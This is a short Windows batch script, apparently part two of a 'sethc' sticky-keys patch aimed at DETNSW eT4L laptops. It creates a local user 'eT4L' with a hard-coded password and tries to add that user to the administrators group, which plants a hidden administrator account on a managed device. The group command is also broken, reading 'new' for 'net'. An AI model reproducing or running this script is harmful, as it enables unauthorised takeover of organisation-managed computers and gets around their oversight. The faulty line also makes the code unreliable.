@echo off
title DETNSW eT4L Boot SETHC Patch Part 2 V1.0 Sethc CMD
cls
echo Patching Account
net user /add eT4L eT4LAdmin
new localgroup administrators eT4L /add
echo Done!
pause
exit